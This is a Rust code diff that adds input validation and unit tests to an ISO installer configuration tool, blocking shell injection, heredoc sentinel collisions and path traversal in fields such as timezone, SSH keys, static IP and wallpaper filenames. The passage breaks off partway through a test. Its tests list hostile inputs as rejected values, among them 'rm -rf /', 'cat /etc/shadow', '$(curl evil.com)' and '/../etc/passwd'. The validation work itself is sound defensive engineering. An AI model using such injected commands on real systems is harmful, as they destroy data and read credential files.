@@ -496,15 +496,27 @@ impl InjectConfig {
             if s.is_empty() {
                 return Ok(());
             }
-            if s.chars()
+            if !s
+                .chars()
                 .all(|c| c.is_alphanumeric() || matches!(c, '/' | ':'))
             {
-                Ok(())
-            } else {
-                Err(EngineError::InvalidConfig(format!(
+                return Err(EngineError::InvalidConfig(format!(
                     "{field} contains unsafe characters: {s:?}"
-                )))
+                )));
             }
+            // Validate that any numeric-looking component is a valid port (1-65535).
+            // Strip trailing "/tcp" or "/udp" protocol suffix before checking.
+            let base = s.split('/').next().unwrap_or(s);
+            for part in base.split(':') {
+                if let Ok(n) = part.parse::<u32>() {
+                    if n == 0 || n > 65535 {
+                        return Err(EngineError::InvalidConfig(format!(
+                            "{field} port number {n} is out of range (1–65535): {s:?}"
+                        )));
+                    }
+                }
+            }
+            Ok(())
         }
 
         // Allows IPv4 (e.g. "8.8.8.8") and IPv6 (e.g. "2001:4860:4860::8888")
@@ -526,11 +538,90 @@ impl InjectConfig {
             }
         }
 
+        // Like is_safe_network_addr but also allows '/' for CIDR prefix notation
+        // (e.g. "192.168.1.10/24" or "2001:db8::1/64").
+        fn is_safe_cidr(s: &str, field: &str) -> EngineResult<()> {
+            if s.is_empty() {
+                return Ok(());
+            }
+            if s.chars().all(|c| {
+                c.is_alphanumeric() || matches!(c, '-' | '_' | '.' | ':' | '[' | ']' | '/')
+            }) {
+                Ok(())
+            } else {
+                Err(EngineError::InvalidConfig(format!(
+                    "{field} contains unsafe characters: {s:?} (only alphanumeric, dash, \
+                     underscore, dot, colon, brackets, slash allowed)"
+                )))
+            }
+        }
+
         if let Some(h) = &self.hostname {
             is_safe_identifier(h, "hostname")?;
         }
         if let Some(u) = &self.username {
             is_safe_identifier(u, "username")?;
+        }
+
+        // Timezone — written as a bare string into cloud-init YAML, Kickstart
+        // `timezone` directive, and preseed `time/zone`.  Only IANA-style chars
+        // are valid (e.g. "America/New_York", "UTC", "Etc/GMT+5").  Block
+        // everything that is not alphanumeric, slash, underscore, dash, or plus.
+        if let Some(tz) = &self.timezone {
+            if tz.is_empty() {
+                return Err(EngineError::InvalidConfig(
+                    "timezone must not be blank".to_string(),
+                ));
+            }
+            if !tz
+                .chars()
+                .all(|c| c.is_alphanumeric() || matches!(c, '/' | '_' | '-' | '+'))
+            {
+                return Err(EngineError::InvalidConfig(format!(
+                    "timezone contains unsafe characters: {tz:?} \
+                     (only alphanumeric, slash, underscore, dash, plus allowed)"
+                )));
+            }
+        }
+
+        // Locale — written as a bare string into cloud-init YAML and installer
+        // directives.  Standard glibc locale names use alphanumeric, dash,
+        // underscore, and dot (e.g. "en_US.UTF-8", "de_DE.ISO-8859-1").
+        if let Some(loc) = &self.locale {
+            if loc.is_empty() {
+                return Err(EngineError::InvalidConfig(
+                    "locale must not be blank".to_string(),
+                ));
+            }
+            if !loc
+                .chars()
+                .all(|c| c.is_alphanumeric() || matches!(c, '_' | '-' | '.'))
+            {
+                return Err(EngineError::InvalidConfig(format!(
+                    "locale contains unsafe characters: {loc:?} \
+                     (only alphanumeric, underscore, dash, dot allowed)"
+                )));
+            }
+        }
+
+        // Keyboard layout — written into cloud-init YAML keyboard.layout.
+        // XKB layout identifiers are alphanumeric plus dash and underscore
+        // (e.g. "us", "de", "gb", "us-intl").
+        if let Some(kb) = &self.keyboard_layout {
+            if kb.is_empty() {
+                return Err(EngineError::InvalidConfig(
+                    "keyboard_layout must not be blank".to_string(),
+                ));
+            }
+            if !kb
+                .chars()
+                .all(|c| c.is_alphanumeric() || matches!(c, '-' | '_'))
+            {
+                return Err(EngineError::InvalidConfig(format!(
+                    "keyboard_layout contains unsafe characters: {kb:?} \
+                     (only alphanumeric, dash, underscore allowed)"
+                )));
+            }
         }
         if let Some(r) = &self.realname {
             // Realname can contain spaces
@@ -675,6 +766,18 @@ impl InjectConfig {
             }
         }
 
+        // Static IP — CIDR notation (e.g. "192.168.1.10/24") placed in cloud-init
+        // netplan YAML, Kickstart `--ip=`, and preseed `netcfg/get_ipaddress`.
+        if let Some(ip) = &self.static_ip {
+            is_safe_cidr(ip, "static_ip")?;
+        }
+
+        // Gateway — plain IP or hostname placed in cloud-init routes and Kickstart
+        // `--gateway=` directive.
+        if let Some(gw) = &self.gateway {
+            is_safe_network_addr(gw, "gateway")?;
+        }
+
         // DNS servers — may be IPv4, IPv6, or hostnames.
         for dns in &self.network.dns_servers {
             is_safe_network_addr(dns, "dns_server")?;
@@ -685,15 +788,97 @@ impl InjectConfig {
             is_safe_network_addr(ntp, "ntp_server")?;
         }
 
+        // SSH authorized_keys — for Mint distro, each key is written via:
+        //   printf '%s\n' 'KEY_CONTENT' >> …/authorized_keys
+        // The key content is single-quoted so $ and ` are literal.  A single
+        // quote (') inside the key content would break out of the quoting and
+        // allow arbitrary shell injection.  Valid SSH public keys never contain
+        // single quotes (base64 alphabet is A-Z a-z 0-9 + / =; the optional
+        // comment field should not contain shell metacharacters), so this check
+        // only rejects malformed or malicious input.
+        //
+        // The FORGEISO_KEY_EOF sentinel check is kept as defense in depth even
+        // though the heredoc approach is no longer used — any future code that
+        // reintroduces a heredoc for these keys would be protected.
+        for key in &self.ssh.authorized_keys {
+            if key.contains('\'') {
+                return Err(EngineError::InvalidConfig(
+                    "authorized_key must not contain a single quote ('): \
+                     single-quoted shell argument would be broken"
+                        .to_string(),
+                ));
+            }
+            // Double-quote check: the Kickstart `sshkey` directive wraps the key
+            // in double quotes (`sshkey --username=user "KEY"`).  A `"` in the key
+            // comment would terminate the quoting early and allow injection.
+            if key.contains('"') {
+                return Err(EngineError::InvalidConfig(
+                    "authorized_key must not contain a double quote (\"): \
+                     double-quoted Kickstart sshkey argument would be broken"
+                        .to_string(),
+                ));
+            }
+            // Newlines: SSH authorized_keys entries are single-line; an embedded
+            // newline would break both the Kickstart sshkey directive (line-oriented)
+            // and the preseed late_command (which is also a single-line shell string).
+            if key.contains('\n') || key.contains('\r') {
+                return Err(EngineError::InvalidConfig(
+                    "authorized_key must not contain a newline: \
+                     each key must be a single line"
+                        .to_string(),
+                ));
+            }
+            for line in key.lines() {
+                if line.trim() == "FORGEISO_KEY_EOF" {
+                    return Err(EngineError::InvalidConfig(
+                        "authorized_key must not contain a line that is exactly \
+                         'FORGEISO_KEY_EOF' (heredoc sentinel collision)"
+                            .to_string(),
+                    ));
+                }
+            }
+        }
+
         // Container users
         for u in &self.containers.docker_users {
             is_safe_identifier(u, "docker_user")?;
         }
 
         // Swap filename
+        // The filename is interpolated as:
+        //   fallocate -l {mb}M /target{fname}   → requires leading / to produce /target/swapfile
+        //   chroot /target mkswap {fname}        → requires absolute path inside the chroot
+        //   echo '{fname} none swap …' >> fstab  → requires absolute path
+        // A relative name like "myswap" would create /targetmyswap (no separator),
+        // and mkswap/fstab would reference a relative path that doesn't exist.
         if let Some(swap) = &self.swap {
+            if swap.size_mb == 0 {
+                return Err(EngineError::InvalidConfig(
+                    "swap.size_mb must be greater than 0".to_string(),
+                ));
+            }
+            if let Some(v) = swap.swappiness {
+                if v > 100 {
+                    return Err(EngineError::InvalidConfig(format!(
+                        "swap.swappiness must be 0–100, got {v}"
+                    )));
+                }
+            }
             if let Some(fname) = &swap.filename {
                 is_safe_path(fname, "swap_filename")?;
+                if !fname.starts_with('/') {
+                    return Err(EngineError::InvalidConfig(format!(
+                        "swap_filename must be an absolute path starting with '/': {fname:?}"
+                    )));
+                }
+                // Block .. path components: fallocate and chmod are called as
+                // `command /target{fname}` so a traversal like `/../etc/passwd`
+                // would resolve to /etc/passwd on the installer's running system.
+                if fname.split('/').any(|c| c == "..") {
+                    return Err(EngineError::InvalidConfig(format!(
+                        "swap_filename must not contain '..' path traversal: {fname:?}"
+                    )));
+                }
             }
         }
 
@@ -715,6 +900,29 @@ impl InjectConfig {
             if !label.is_ascii() {
                 return Err(EngineError::InvalidConfig(
                     "output_label must contain only ASCII characters".to_string(),
+                ));
+            }
+        }
+
+        // Wallpaper — the filename component is used directly in an unquoted shell
+        // `cp /cdrom/wallpaper/{filename}` command.  A malicious filename like
+        // `foo; rm -rf /.jpg` would execute arbitrary code on the installer's
+        // running system.  Apply the same character set as is_safe_path: only
+        // alphanumeric, dash, underscore, dot, and plus are allowed.
+        if let Some(wp) = &self.wallpaper {
+            if let Some(fname) = wp.file_name().and_then(|n| n.to_str()) {
+                if fname
+                    .chars()
+                    .any(|c| !c.is_alphanumeric() && !matches!(c, '-' | '_' | '.' | '+'))
+                {
+                    return Err(EngineError::InvalidConfig(format!(
+                        "wallpaper filename contains unsafe characters: {fname:?} \
+                         (only alphanumeric, dash, underscore, dot, plus allowed)"
+                    )));
+                }
+            } else {
+                return Err(EngineError::InvalidConfig(
+                    "wallpaper path must have a valid UTF-8 filename component".to_string(),
                 ));
             }
         }
@@ -742,6 +950,15 @@ impl InjectConfig {
                 )));
             }
         }
+        // GRUB timeout — written as a number into GRUB_TIMEOUT=N; unreasonably
+        // large values produce unusable systems.  Cap at 3600 (1 hour).
+        if let Some(t) = self.grub.timeout {
+            if t > 3600 {
+                return Err(EngineError::InvalidConfig(format!(
+                    "grub_timeout must be 0–3600 seconds, got {t}"
+                )));
+            }
+        }
 
         // out_name — used as a filename component joined with the output directory.
         // Block path separators (/ and \) to prevent writing outside the workspace.
@@ -765,22 +982,27 @@ impl InjectConfig {
 
         // DNF mirror — interpolated into: sed -i 's|^baseurl=.*|baseurl={mirror}/…|'
         // The `|` character is the sed delimiter so it must be blocked to prevent
-        // the substitution from being split or manipulated.  Newlines would also
-        // break the sed one-liner.
+        // the substitution from being split or manipulated.  Newlines and null bytes
+        // would also break the sed one-liner or produce invalid output.
         if let Some(mirror) = &self.dnf_mirror {
             if mirror.contains('|') || mirror.contains('\n') || mirror.contains('\r') {
                 return Err(EngineError::InvalidConfig(format!(
                     "dnf_mirror must not contain `|` (sed delimiter) or newlines: {mirror:?}"
                 )));
             }
+            if mirror.contains('\0') {
+                return Err(EngineError::InvalidConfig(
+                    "dnf_mirror must not contain a null byte".to_string(),
+                ));
+            }
         }
 
         // DNF repos — two write paths exist in kickstart.rs:
         //   URL entries  → single-quoted:  dnf config-manager --add-repo '…'
-        //   Stanza entries → printf '%s\n' {stanza:?}  (Rust Debug escaping — safe)
+        //   Stanza entries → heredoc:      cat > /etc/yum.repos.d/… << 'FORGEISO_REPO_EOF'
         // For URL entries a literal ' would break out of the single-quoted argument,
-        // so we block it.  Stanza entries go through {:?} which handles all escaping;
-        // we only need to guard against the single-quote path for URL-shaped entries.
+        // so we block it.  Stanza entries use a heredoc with a fixed sentinel so they
+        // are safe against all shell metacharacters; only null bytes are rejected below.
         for repo in &self.dnf_repos {
             let trimmed = repo.trim();
             if trimmed.starts_with("http://") || trimmed.starts_with("https://") {
@@ -797,6 +1019,18 @@ impl InjectConfig {
                 return Err(EngineError::InvalidConfig(format!(
                     "dnf_repo contains a null byte: {repo:?}"
                 )));
+            }
+            // Stanza path: the heredoc sentinel must not appear as a standalone
+            // line in the stanza — it would terminate the heredoc early and
+            // produce a truncated .repo file.
+            for line in repo.lines() {
+                if line.trim() == "FORGEISO_REPO_EOF" {
+                    return Err(EngineError::InvalidConfig(
+                        "dnf_repo stanza must not contain a line that is exactly \
+                         'FORGEISO_REPO_EOF' (heredoc sentinel collision)"
+                            .to_string(),
+                    ));
+                }
             }
         }
 
@@ -819,6 +1053,58 @@ impl InjectConfig {
                     "pacman_repo must not contain single quotes or newlines: {repo:?}"
                 )));
             }
+        }
+
+        // expected_sha256 — must be exactly 64 lowercase hex characters if provided.
+        // A non-hex value would cause a confusing "SHA-256 mismatch" error at
+        // download time rather than a clear "invalid format" error at config time.
+        if let Some(sha) = &self.expected_sha256 {
+            let sha = sha.trim().to_ascii_lowercase();
+            if sha.len() != 64 || !sha.chars().all(|c| c.is_ascii_hexdigit()) {
+                return Err(EngineError::InvalidConfig(format!(
+                    "expected_sha256 must be a 64-character hex string, got {:?} ({} chars)",
+                    sha,
+                    sha.len()
+                )));
+            }
+        }
+
+        // Swap size upper bound — accepting arbitrarily large values (e.g. 999 GB)
+        // would not fail validation but would produce a swap file that can never be
+        // allocated, causing the installer to hang or error at runtime.
+        // Cap at 128 GB (131072 MB), which is larger than any reasonable swap need.
+        if let Some(swap) = &self.swap {
+            if swap.size_mb > 131_072 {
+                return Err(EngineError::InvalidConfig(format!(
+                    "swap.size_mb {} exceeds maximum of 131072 (128 GiB)",
+                    swap.size_mb
+                )));
+            }
+        }
+
+        // Encryption: a passphrase is required when encrypt=true.
+        // cloud-init autoinstall requires storage.layout.password; without it
+        // the installer fails or silently uses an empty LUKS passphrase, which
+        // is a serious security defect. There is no interactive fallback in
+        // unattended mode.
+        if self.encrypt && self.encrypt_passphrase.is_none() {
+            return Err(EngineError::InvalidConfig(
+                "encrypt is enabled but no encrypt_passphrase was provided; \
+                 Ubuntu cloud-init requires a LUKS passphrase in the storage layout"
+                    .to_string(),
+            ));
+        }
+
+        // Encryption also requires a storage_layout — without one, the autoinstall
+        // YAML has no storage.layout block, so the LUKS password has nowhere to go
+        // and encryption is silently skipped by cloud-init.
+        if self.encrypt && self.storage_layout.is_none() {
+            return Err(EngineError::InvalidConfig(
+                "encrypt is enabled but no storage_layout was provided; \
+                 Ubuntu cloud-init requires a named storage layout (e.g. 'lvm' or 'direct') \
+                 to attach the LUKS passphrase to"
+                    .to_string(),
+            ));
         }
 
         Ok(())
@@ -1606,7 +1892,7 @@ mod tests {
     #[test]
     fn inject_accepts_dnf_repo_stanza_with_dollar_sign() {
         // $releasever and $basearch are standard DNF stanza variables.
-        // They go through printf '%s\n' {:?} (Rust Debug), not single-quoted shell.
+        // They go through a heredoc (not single-quoted shell), so $ is safe.
         let cfg = InjectConfig {
             dnf_repos: vec!["[rpmfusion-free]\nbaseurl=https://mirrors.rpmfusion.org/free/fedora/$releasever/$basearch\nenabled=1".into()],
             ..Default::default()
@@ -1663,6 +1949,678 @@ mod tests {
         assert!(
             cfg.validate().is_ok(),
             "standard pacman Server= line with template vars must be accepted"
+        );
+    }
+
+    // ── DNF heredoc sentinel collision ────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_dnf_repo_stanza_containing_heredoc_sentinel() {
+        // A line that is exactly the heredoc sentinel would terminate the
+        // `cat > .repo << 'FORGEISO_REPO_EOF'` heredoc early, producing a
+        // truncated .repo file.
+        let cfg = InjectConfig {
+            dnf_repos: vec![
+                "[myrepo]\nbaseurl=https://mirror.example.com\nFORGEISO_REPO_EOF\ngpgcheck=1"
+                    .into(),
+            ],
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "dnf_repo stanza containing heredoc sentinel line must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_dnf_repo_stanza_with_sentinel_as_substring() {
+        // The sentinel only terminates if it appears alone on a line — as a
+        // substring of a longer line it is harmless.
+        let cfg = InjectConfig {
+            dnf_repos: vec![
+                "[myrepo]\n# generated by FORGEISO_REPO_EOF_marker\nbaseurl=https://mirror.example.com\n".into(),
+            ],
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_ok(),
+            "sentinel as substring of a longer line must be accepted"
+        );
+    }
+
+    // ── SSH key validation ─────────────────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_ssh_key_with_single_quote() {
+        // Mint preseed uses printf '%s\n' 'KEY' — a single quote in the key
+        // content would break out of the single-quoting and allow arbitrary
+        // shell injection.
+        use crate::config::SshConfig;
+        let cfg = InjectConfig {
+            ssh: SshConfig {
+                authorized_keys: vec!["ssh-ed25519 AAAA'; evil_cmd #".into()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "authorized_key with single quote must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_rejects_ssh_key_containing_heredoc_sentinel() {
+        // Defense in depth: even though the heredoc approach is no longer used,
+        // a key whose content matches the old FORGEISO_KEY_EOF sentinel as a
+        // standalone line is still rejected.  If the heredoc approach is ever
+        // reintroduced, this check prevents early termination.
+        use crate::config::SshConfig;
+        let cfg = InjectConfig {
+            ssh: SshConfig {
+                authorized_keys: vec![
+                    "ssh-ed25519 AAAA...\nFORGEISO_KEY_EOF\nssh-ed25519 BBBB...".into()
+                ],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "authorized_key containing heredoc sentinel as a standalone line must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_valid_ssh_key() {
+        // A well-formed ed25519 public key with a realistic comment must be accepted.
+        use crate::config::SshConfig;
+        let cfg = InjectConfig {
+            ssh: SshConfig {
+                authorized_keys: vec![
+                    "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFORGEISo_KEY_EOF_not_a_sentinel user@host".into(),
+                ],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_ok(),
+            "valid SSH public key must be accepted"
+        );
+    }
+
+    // ── Swap filename ──────────────────────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_relative_swap_filename() {
+        // A relative filename like "myswap" produces /targetmyswap (missing the
+        // path separator), and mkswap/fstab would reference a non-existent path.
+        let cfg = InjectConfig {
+            swap: Some(SwapConfig {
+                size_mb: 1024,
+                filename: Some("myswap".into()),
+                swappiness: None,
+            }),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "relative swap_filename must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_absolute_swap_filename() {
+        // The default "/swapfile" and any absolute path must be accepted.
+        let cfg = InjectConfig {
+            swap: Some(SwapConfig {
+                size_mb: 1024,
+                filename: Some("/swap/swapfile".into()),
+                swappiness: None,
+            }),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_ok(),
+            "absolute swap_filename must be accepted"
+        );
+    }
+
+    // ── SSH key double-quote and newline validation ────────────────────────────
+
+    #[test]
+    fn inject_rejects_ssh_key_with_double_quote() {
+        // Kickstart wraps keys in double quotes: sshkey --username=user "KEY"
+        // A double quote inside the key comment would terminate the argument early
+        // and allow injection into the kickstart file.
+        use crate::config::SshConfig;
+        let cfg = InjectConfig {
+            ssh: SshConfig {
+                authorized_keys: vec![r#"ssh-ed25519 AAAA user@"hostname""#.into()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "SSH key with double quote must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_rejects_ssh_key_with_newline() {
+        // Newlines in an SSH key break line-oriented directives (Kickstart sshkey,
+        // preseed late_command) and are not valid in authorized_keys entries.
+        use crate::config::SshConfig;
+        let cfg = InjectConfig {
+            ssh: SshConfig {
+                authorized_keys: vec!["ssh-ed25519 AAAA\nmalicious-command".into()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "SSH key with embedded newline must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_rejects_swap_filename_with_dotdot() {
+        // A swap filename containing .. could produce /target/../etc/passwd
+        // (resolving to /etc/passwd on the running installer system) via
+        // `fallocate -l {mb}M /target{fname}`.  The validator must block it.
+        let cfg = InjectConfig {
+            swap: Some(crate::config::SwapConfig {
+                size_mb: 512,
+                filename: Some("/../etc/passwd".to_string()),
+                swappiness: None,
+            }),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "swap_filename with .. path traversal must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_valid_swap_filename() {
+        let cfg = InjectConfig {
+            swap: Some(crate::config::SwapConfig {
+                size_mb: 1024,
+                filename: Some("/swapfile".to_string()),
+                swappiness: Some(10),
+            }),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_ok(),
+            "valid absolute swap_filename must be accepted"
+        );
+    }
+
+    #[test]
+    fn encrypt_without_passphrase_is_rejected() {
+        let cfg = InjectConfig {
+            encrypt: true,
+            encrypt_passphrase: None,
+            ..Default::default()
+        };
+        let err = cfg.validate().unwrap_err();
+        let msg = err.to_string();
+        assert!(
+            msg.contains("encrypt_passphrase"),
+            "error must mention encrypt_passphrase: {msg}"
+        );
+    }
+
+    #[test]
+    fn encrypt_with_passphrase_is_accepted() {
+        let cfg = InjectConfig {
+            encrypt: true,
+            encrypt_passphrase: Some("correct-horse-battery-staple".to_string()),
+            storage_layout: Some("lvm".to_string()),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_ok(),
+            "encrypt=true with passphrase + storage_layout must pass validation"
+        );
+    }
+
+    #[test]
+    fn encrypt_without_storage_layout_is_rejected() {
+        // Regression: encrypt=true without storage_layout was silently accepted
+        // but the YAML had no storage.layout block to attach the LUKS password to,
+        // causing encryption to be silently skipped by cloud-init.
+        let cfg = InjectConfig {
+            encrypt: true,
+            encrypt_passphrase: Some("supersecret".to_string()),
+            storage_layout: None,
+            ..Default::default()
+        };
+        let err = cfg.validate().unwrap_err();
+        let msg = err.to_string();
+        assert!(
+            msg.contains("storage_layout"),
+            "error must mention storage_layout: {msg}"
+        );
+    }
+
+    #[test]
+    fn wallpaper_filename_rejects_shell_injection() {
+        // The wallpaper filename is embedded unquoted in a `cp /cdrom/wallpaper/{fname}` shell
+        // command — a semicolon, space, or other metacharacter allows code injection.
+        for bad in &[
+            "/tmp/foo;bar.jpg",      // semicolon in filename
+            "/tmp/my wallpaper.jpg", // space in filename
+            "/tmp/wall$(uname).jpg", // dollar-paren in filename
+            "/tmp/wall`id`.jpg",     // backtick in filename
+            "/tmp/wall'inject'.jpg", // single-quote in filename
+        ] {
+            let cfg = InjectConfig {
+                wallpaper: Some(PathBuf::from(bad)),
+                ..Default::default()
+            };
+            assert!(
+                cfg.validate().is_err(),
+                "wallpaper {:?} with unsafe characters must be rejected",
+                bad
+            );
+        }
+    }
+
+    #[test]
+    fn wallpaper_filename_accepts_safe_names() {
+        for good in &[
+            "/tmp/wallpaper.jpg",
+            "/home/user/my-wallpaper_v2.png",
+            "/media/background+image.webp",
+        ] {
+            let cfg = InjectConfig {
+                wallpaper: Some(PathBuf::from(good)),
+                ..Default::default()
+            };
+            assert!(
+                cfg.validate().is_ok(),
+                "wallpaper {:?} with safe filename must be accepted",
+                good
+            );
+        }
+    }
+
+    #[test]
+    fn static_ip_rejects_shell_metacharacters() {
+        // static_ip is placed in cloud-init YAML, Kickstart --ip=, and preseed
+        // directives.  Shell metacharacters must be rejected to prevent malformed
+        // configs and potential injection into installer directives.
+        for bad in &[
+            "192.168.1.1; rm -rf /",
+            "192.168.1.1 && cat /etc/shadow",
+            "$(curl evil.com)",
+            "192.168.1.1\nnewline-injected",
+        ] {
+            let cfg = InjectConfig {
+                static_ip: Some((*bad).to_string()),
+                ..Default::default()
+            };
+            assert!(
+                cfg.validate().is_err(),
+                "static_ip {:?} must be rejected",
+                bad
+            );
+        }
+    }
+
+    #[test]
+    fn static_ip_accepts_valid_cidr() {
+        for good in &["192.168.1.10/24", "10.0.0.1/8", "2001:db8::1/64"] {
+            let cfg = InjectConfig {
+                static_ip: Some((*good).to_string()),
+                ..Default::default()
+            };
+            assert!(
+                cfg.validate().is_ok(),
+                "static_ip {:?} must be accepted",
+                good
+            );
+        }
+    }
+
+    #[test]
+    fn gateway_rejects_shell_metacharacters() {
+        for bad in &["10.0.0.1; rm -rf /", "10.0.0.1 | cat /etc/passwd"] {
+            let cfg = InjectConfig {
+                gateway: Some((*bad).to_string()),
+                ..Default::default()
+            };
+            assert!(
+                cfg.validate().is_err(),
+                "gateway {:?} must be rejected",
+                bad
+            );
+        }
+    }
+
+    #[test]
+    fn gateway_accepts_valid_ip() {
+        for good in &["10.0.0.1", "192.168.1.1", "2001:db8::1"] {
+            let cfg = InjectConfig {
+                gateway: Some((*good).to_string()),
+                ..Default::default()
+            };
+            assert!(
+                cfg.validate().is_ok(),
+                "gateway {:?} must be accepted",
+                good
+            );
+        }
+    }
+
+    // ── Swap validation ────────────────────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_swap_size_zero() {
+        let cfg = InjectConfig {
+            swap: Some(SwapConfig {
+                size_mb: 0,
+                ..Default::default()
+            }),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "swap.size_mb == 0 must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_swap_size_nonzero() {
+        let cfg = InjectConfig {
+            swap: Some(SwapConfig {
+                size_mb: 512,
+                ..Default::default()
+            }),
+            ..Default::default()
+        };
+        assert!(cfg.validate().is_ok(), "swap.size_mb 512 must be accepted");
+    }
+
+    #[test]
+    fn inject_rejects_swappiness_over_100() {
+        let cfg = InjectConfig {
+            swap: Some(SwapConfig {
+                size_mb: 1024,
+                swappiness: Some(101),
+                ..Default::default()
+            }),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "swappiness 101 must be rejected (max 100)"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_swappiness_at_boundary() {
+        for v in [0u8, 60, 100] {
+            let cfg = InjectConfig {
+                swap: Some(SwapConfig {
+                    size_mb: 1024,
+                    swappiness: Some(v),
+                    ..Default::default()
+                }),
+                ..Default::default()
+            };
+            assert!(cfg.validate().is_ok(), "swappiness {v} must be accepted");
+        }
+    }
+
+    // ── Port validation ────────────────────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_port_zero() {
+        let cfg = InjectConfig {
+            firewall: FirewallConfig {
+                allow_ports: vec!["0".to_string()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(cfg.validate().is_err(), "port 0 must be rejected");
+    }
+
+    #[test]
+    fn inject_rejects_port_over_65535() {
+        let cfg = InjectConfig {
+            firewall: FirewallConfig {
+                allow_ports: vec!["99999".to_string()],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(cfg.validate().is_err(), "port 99999 must be rejected");
+    }
+
+    #[test]
+    fn inject_accepts_port_range_valid() {
+        let cfg = InjectConfig {
+            firewall: FirewallConfig {
+                allow_ports: vec![
+                    "80:443/tcp".to_string(),
+                    "22".to_string(),
+                    "ssh".to_string(),
+                ],
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(cfg.validate().is_ok(), "valid port specs must be accepted");
+    }
+
+    // ── GRUB timeout validation ────────────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_grub_timeout_over_3600() {
+        let cfg = InjectConfig {
+            grub: GrubConfig {
+                timeout: Some(3601),
+                ..Default::default()
+            },
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "grub_timeout > 3600 must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_grub_timeout_at_boundary() {
+        for t in [0u32, 1, 10, 3600] {
+            let cfg = InjectConfig {
+                grub: GrubConfig {
+                    timeout: Some(t),
+                    ..Default::default()
+                },
+                ..Default::default()
+            };
+            assert!(cfg.validate().is_ok(), "grub_timeout {t} must be accepted");
+        }
+    }
+
+    // ── timezone / locale / keyboard_layout validation ────────────────────────
+
+    #[test]
+    fn inject_rejects_timezone_with_semicolon() {
+        let cfg = InjectConfig {
+            timezone: Some("UTC; rm -rf /".into()),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "timezone with ';' must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_valid_timezone() {
+        for tz in ["UTC", "America/New_York", "Europe/London", "Etc/GMT+5"] {
+            let cfg = InjectConfig {
+                timezone: Some(tz.into()),
+                ..Default::default()
+            };
+            assert!(cfg.validate().is_ok(), "timezone {tz:?} must be accepted");
+        }
+    }
+
+    #[test]
+    fn inject_rejects_locale_with_metachar() {
+        let cfg = InjectConfig {
+            locale: Some("en_US.UTF-8; evil".into()),
+            ..Default::default()
+        };
+        assert!(cfg.validate().is_err(), "locale with ';' must be rejected");
+    }
+
+    #[test]
+    fn inject_accepts_valid_locale() {
+        for loc in ["en_US.UTF-8", "de_DE", "zh_CN.UTF-8"] {
+            let cfg = InjectConfig {
+                locale: Some(loc.into()),
+                ..Default::default()
+            };
+            assert!(cfg.validate().is_ok(), "locale {loc:?} must be accepted");
+        }
+    }
+
+    #[test]
+    fn inject_rejects_keyboard_layout_with_metachar() {
+        let cfg = InjectConfig {
+            keyboard_layout: Some("us$(id)".into()),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "keyboard_layout with '$' must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_valid_keyboard_layout() {
+        for kb in ["us", "de", "gb", "us-intl"] {
+            let cfg = InjectConfig {
+                keyboard_layout: Some(kb.into()),
+                ..Default::default()
+            };
+            assert!(
+                cfg.validate().is_ok(),
+                "keyboard_layout {kb:?} must be accepted"
+            );
+        }
+    }
+
+    // ── expected_sha256 validation ─────────────────────────────────────────────
+
+    #[test]
+    fn inject_rejects_sha256_wrong_length() {
+        let cfg = InjectConfig {
+            expected_sha256: Some("abc123".into()),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "expected_sha256 with wrong length must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_rejects_sha256_non_hex() {
+        let cfg = InjectConfig {
+            expected_sha256: Some("z".repeat(64)),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_err(),
+            "expected_sha256 with non-hex chars must be rejected"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_valid_sha256() {
+        let cfg = InjectConfig {
+            expected_sha256: Some(
+                "a948904f2f0f479b8f936b0e0b4a12d4b9d1f2e3c4d5e6f7a8b9c0d1e2f3a4b5".into(),
+            ),
+            ..Default::default()
+        };
+        assert!(
+            cfg.validate().is_ok(),
+            "valid 64-char hex SHA-256 must pass"
+        );
+    }
+
+    #[test]
+    fn inject_accepts_sha256_uppercase() {
